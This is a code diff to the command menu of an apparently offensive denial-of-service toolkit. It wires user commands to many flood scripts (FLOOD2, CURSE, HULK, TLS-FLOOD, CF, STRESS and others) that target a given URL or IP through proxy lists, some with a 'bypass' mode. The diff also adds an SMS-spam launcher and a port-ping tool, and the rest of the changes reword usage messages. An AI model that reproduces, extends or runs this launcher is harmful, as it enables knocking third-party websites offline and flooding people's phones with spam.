@@ -190,6 +190,7 @@ def tools():
                         ║   \x1b[38;5;255mIP\x1b[38;5;160m       |    Lookup Domain/IP Infomation    ║
                         ║   \x1b[38;5;255mSCRAPE\x1b[38;5;160m   |    Get Proxy Live                 ║
                         ║   \x1b[38;5;255mCHECK\x1b[38;5;160m    |    Check for live proxy           ║
+                        ║   \x1b[38;5;255mPAPING\x1b[38;5;160m   |    Get IP status in real time     ║
                         ╚════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -339,12 +340,14 @@ def main():
                         os.system(f'cd AA && python3 scrape.py')
                 if sinput == "check" or sinput == "CHECK" or sinput == "checklive" or sinput == "proxycheck" or sinput == "checkproxy" or sinput == "livecheck":
                         os.system(f'cd AA && python check.py')
+                if sinput == "spamsms" or sinput == "SPAMSMS":
+                        os.system(f'cd AA && python spamsms.py')
                 elif sinput == "ip" or sinput == "IP":
                         try:
                                 query = sin.split()[1]  # Assuming the IP address is the second argument
                                 get_ip_information(query)
                         except IndexError:
-                               print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mIP <ip/adress>")
+                               print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mIP <ip/adress>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mIP 8.8.8.8')
 #########LAYER-7########
                 
@@ -377,7 +380,7 @@ def main():
                                 os.system ("clear")
                                 os.system(f'cd L7 && node ck-browser.js {url} {time} {threads} proxy.txt')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mBROWSER <url> <time> <threads>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBROWSER <url> <time> <threads>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBROWSER https://example.com 120 10')
                 
                 elif sinput == "FLOOD2" or sinput == "flood2":
@@ -386,7 +389,7 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd L7 && node FLOOD2.js {url} {time} 200 8 proxy.txt bypass')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mFLOOD2 <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD2 <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD2 https://example.com 120')
                  
                 elif sinput == "HOME" or sinput == "home":
@@ -396,7 +399,7 @@ def main():
                                 time = sin.split()[3]
                                 os.system(f'cd L4 && perl home.pl {url} {port} 65500 {time}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mHOME <ip> <port> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHOME <ip> <port> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHOME 1.1.1.1 433')
 
                 elif sinput == "CURSE" or sinput == "curse":
@@ -406,7 +409,7 @@ def main():
                                 rate = sin.split()[3]
                                 os.system(f'cd L7 && node CURSE.js {url} {time} {rate} 10 socks4.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mCURSE <url> <time> <rate>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCURSE <url> <time> <rate>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCURSE https://example.com 120 64')
                 
                 elif sinput == "SPIKE" or sinput == "spike":
@@ -416,7 +419,7 @@ def main():
                                 thread = sin.split()[3]
                                 os.system(f'cd L7 && node SPIKE.js {url} {thread} {time}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mSPIKE <url> <threads> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSPIKE <url> <threads> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSPIKE https://example.com 20 120')
                         
                 elif sinput == "CHAOS" or sinput == "chaos":
@@ -425,7 +428,7 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd L7 && node CHAOS.js {url} {time} 250 8 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mCHAOS <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCHAOS <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCHAOS https://example.com 120')
 
                 elif sinput == "KILLER" or sinput == "killer":
@@ -434,7 +437,7 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd L7 && node KILLER.js {url} {time} 100 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mKILLER <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mKILLER <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mKILLER https://example.com 120')
     
                 elif sinput == "HULK" or sinput == "hulk":
@@ -443,7 +446,7 @@ def main():
                                 method = sin.split()[2]
                                 os.system(f'cd L7 && go run HULK.go -site {url} {method} nil')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mHULK <url> <GET/POST>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHULK <url> <GET/POST>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHULK https://example.com GET')
 
                 elif sinput == "404" or sinput == "404":
@@ -452,7 +455,7 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd L7 && node 404.js {url} {time} 80 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255m404 <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255m404 <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255m404 https://example.com 120')
                                 
                 elif sinput == "CF" or sinput == "cf":
@@ -461,15 +464,17 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd L7 && node CF.js {url} {time} 64 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mCF <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCF <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCF https://example.com 120')
 
-                elif sinput == "SPAMSMS" or sinput == "spamsms":
+                elif sinput == "paping" or sinput == "PAPING":
                         try:
-                                os.system(f'cd AA && python spamsms.py')
+                                ip = sin.split()[1]
+                                port = sin.split()[2]
+                                os.system(f'cd AA && python paping.py {ip} {port}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: SPAMSMS")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: SPAMSMS')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPAPING <ip> <port>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPAPING 1.1.1.1 80')
         
                 elif sinput == "HTTP-STRESS" or sinput == "http-stress":
                         try:
@@ -477,7 +482,7 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd L7 && node STRESS.js {url} {time} 250 8 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mHTTP-STRESS <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTP-STRESS <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHTTP-STRESS https://example.com 120')
 
                 elif sinput == "TLS-FLOOD" or sinput == "tls-flood":
@@ -487,7 +492,7 @@ def main():
                                 requests = sin.split()[3]
                                 os.system(f'cd VIP && node TLS-FLOOD.js {url} {time} {requests} 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mTLS-FLOOD <url> <time> <request per ip>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTLS-FLOOD <url> <time> <request per ip>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTLS-FLOOD https://example.com 120 8')
 
                 elif sinput == "HTTP-LOAD" or sinput == "http-load":
@@ -497,7 +502,7 @@ def main():
                                 os.system(f'cd VIP && node HTTP-LOAD.js {url} {time} 64 10 proxy.txt')
                                 os.system ("clear")
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mHTTP-LOAD <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTP-LOAD <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHTTP-LOAD https://example.com 120')
 
                 elif sinput == "STRESS" or sinput == "stress":
@@ -507,7 +512,7 @@ def main():
                                 time = sin.split()[3]
                                 os.system(f'cd L4 && go run STRESS.go {url} {port} 3 2000 {time} {time}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mSTRESS <url> <port> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSTRESS <url> <port> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSTRESS https://example.com 443 120')
 
                 elif sinput == "UAMCFL" or sinput == "uamcfl":
@@ -516,7 +521,7 @@ def main():
                                 time = sin.split()[2]
                                 os.system(f'cd VIP && node UAMCFL.js {url} {time} 64 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mUAMCFL <url> <time>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUAMCFL https://example.com 120')
 
                 elif sinput == "ENC" or sinput == "enc":
@@ -526,7 +531,7 @@ def main():
                                 rate = sin.split()[3]
                                 os.system(f'cd VIP && node ENC.js {url} {time} {rate} 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mENC <url> <time> <rate>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mENC <url> <time> <rate>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mENC https://example.com 120 64')
 
                 elif sinput == "DNK" or sinput == "dnk":
@@ -536,7 +541,7 @@ def main():
                                 rate = sin.split()[3]
                                 os.system(f'cd L7 && node DNK.js {url} {time} {rate} 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mDNK <url> <time> <rate>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mDNK <url> <time> <rate>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mDNK https://example.com 120 64')
 
                 else:
